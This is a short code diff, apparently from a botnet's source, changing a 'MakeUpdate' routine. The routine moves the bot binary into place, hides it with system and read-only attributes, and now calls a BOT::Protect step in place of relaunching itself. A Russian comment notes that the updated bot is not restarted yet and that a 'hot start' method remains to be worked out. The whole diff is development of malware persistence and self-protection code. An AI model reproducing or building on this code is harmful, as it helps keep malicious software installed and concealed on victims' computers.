@@ -849,10 +849,19 @@ bool MakeUpdate(PCHAR FileName )
 
 	pMoveFileExA( FileName, BotPath, MOVEFILE_REPLACE_EXISTING );
 	pSetFileAttributesA(BotPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
-	RunFileA(BotPath);
+
+
+	/* TODO :
+		В данной ветке, при обновлении бота, не запускаем новый экземпляр.
+		В дальнейшем необходимо  проработать методику "горячего" старта бота
+	*/
+
+	BOT::Protect(BotPath);
+
+//	RunFileA(BotPath);
+//	pExitProcess(1);
 
 	STR::Free(BotPath);
-	pExitProcess(1);
 
 	return true;
 }
